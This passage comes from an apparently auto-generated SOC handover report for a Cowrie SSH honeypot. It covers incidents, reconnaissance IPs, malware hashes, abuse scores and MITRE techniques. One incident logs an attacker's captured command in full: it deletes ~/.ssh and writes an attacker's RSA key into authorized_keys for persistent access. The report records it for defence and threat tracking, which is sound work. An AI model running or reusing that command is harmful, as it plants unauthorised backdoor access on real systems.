| `2026-06-13 23:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ccb2a852ba

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-06-13 23:05 |
| **Last Seen** | 2026-06-13 23:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 23:05:52` | `cowrie.session.connect` |
| `2026-06-13 23:05:52` | `cowrie.client.version` |
| `2026-06-13 23:05:52` | `cowrie.client.kex` |
| `2026-06-13 23:05:52` | `cowrie.login.success` |
| `2026-06-13 23:05:52` | `cowrie.session.params` |
| `2026-06-13 23:05:52` | `cowrie.command.input` |
| `2026-06-13 23:05:52` | `cowrie.command.failed` |
| `2026-06-13 23:05:52` | `cowrie.log.closed` |
| `2026-06-13 23:05:52` | `cowrie.session.params` |
| `2026-06-13 23:05:52` | `cowrie.command.input` |
| `2026-06-13 23:05:52` | `cowrie.session.file_download` |
| `2026-06-13 23:05:52` | `cowrie.log.closed` |
| `2026-06-13 23:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a24408b3142c

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-06-13 23:05 |
| **Last Seen** | 2026-06-13 23:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 23:05:54` | `cowrie.session.connect` |
| `2026-06-13 23:05:54` | `cowrie.client.version` |
| `2026-06-13 23:05:54` | `cowrie.client.kex` |
| `2026-06-13 23:05:54` | `cowrie.login.success` |
| `2026-06-13 23:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.230.150[.]187` | **91** | 2026-06-13 21:20 | 2026-06-13 23:08 | 56m | 0 | `T1592` | 🟠 MEDIUM |
| `159.223.213[.]49` | **30** | 2026-06-13 21:43 | 2026-06-13 22:30 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.164.192[.]38` | **30** | 2026-06-13 21:41 | 2026-06-13 22:52 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.75.183[.]177` | **15** | 2026-06-13 22:03 | 2026-06-13 22:33 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `62.171.168[.]158` | **10** | 2026-06-13 21:21 | 2026-06-13 21:42 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.25.158[.]74` | **8** | 2026-06-13 21:21 | 2026-06-13 21:33 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `152.52.15[.]213` | **4** | 2026-06-13 22:50 | 2026-06-13 23:07 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `43.165.62[.]10` | **3** | 2026-06-13 22:10 | 2026-06-13 22:18 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `158.180.79[.]132` | **2** | 2026-06-13 22:49 | 2026-06-13 23:04 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `166.62.92[.]145` | **2** | 2026-06-13 22:52 | 2026-06-13 22:57 | 1m | 0 | `T1592` | 🟢 LOW |
| `213.136.88[.]112` | **2** | 2026-06-13 21:21 | 2026-06-13 21:23 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `47.250.81[.]7` | **2** | 2026-06-13 22:48 | 2026-06-13 22:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.189.27[.]179` | 1 | 2026-06-13 22:30 | 2026-06-13 22:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.153[.]156` | 1 | 2026-06-13 21:35 | 2026-06-13 21:36 | 28s | 0 | `T1592` | 🟢 LOW |
| `119.98.21[.]180` | 1 | 2026-06-13 21:27 | 2026-06-13 21:27 | 13s | 0 | `T1592` | 🟢 LOW |
| `122.13.25[.]186` | 1 | 2026-06-13 22:25 | 2026-06-13 22:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.59.208[.]49` | 1 | 2026-06-13 22:00 | 2026-06-13 22:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.118[.]212` | 1 | 2026-06-13 22:54 | 2026-06-13 22:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `153.37.228[.]2` | 1 | 2026-06-13 21:45 | 2026-06-13 21:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `171.114.226[.]14` | 1 | 2026-06-13 21:31 | 2026-06-13 21:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.76.236[.]214` | 1 | 2026-06-13 22:59 | 2026-06-13 23:00 | 58s | 0 | `T1592` | 🟢 LOW |
| `188.166.246[.]68` | 1 | 2026-06-13 22:57 | 2026-06-13 22:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.151.187[.]107` | 1 | 2026-06-13 22:49 | 2026-06-13 22:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.128.160[.]208` | 1 | 2026-06-13 21:31 | 2026-06-13 21:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.105.205[.]153` | 1 | 2026-06-13 21:49 | 2026-06-13 21:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.140.193[.]156` | 1 | 2026-06-13 22:58 | 2026-06-13 22:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.78.202[.]217` | 1 | 2026-06-13 23:01 | 2026-06-13 23:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.152.168[.]184` | 1 | 2026-06-13 22:58 | 2026-06-13 22:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.238.22[.]252` | 1 | 2026-06-13 21:56 | 2026-06-13 21:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.99.139[.]53` | 1 | 2026-06-13 23:02 | 2026-06-13 23:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.99.139[.]53` | DE | Hetzner Online GmbH | **100** ⚠️ | 0 |
| `43.164.192[.]38` | BR | ACEVILLE PTE.LTD. | **100** ⚠️ | 0 |
| `62.171.168[.]158` | FR | Contabo GmbH | **100** ⚠️ | 3 |
| `43.165.62[.]10` | DE | ACEVILLE PTE.LTD. | **100** ⚠️ | 11 |
| `157.230.150[.]187` | US | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `180.76.236[.]214` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `213.136.88[.]112` | FR | Contabo GmbH | **100** ⚠️ | 1 |
| `159.223.213[.]49` | NL | DigitalOcean, LLC | **100** ⚠️ | 26 |
| `166.62.92[.]145` | US | GoDaddy.com, LLC | **100** ⚠️ | 14 |
| `59.152.168[.]184` | KR | HVGangwon | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 194 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 111 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 76 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 39 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 39 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 26 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 322 cases |
| Tool 34  | Credential Extractor        | ✅ 187 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (9.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 76 priority case(s) shown individually · 30 recon entry/entries in table (12 group(s) consolidating 199 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-13T23:10:14Z_
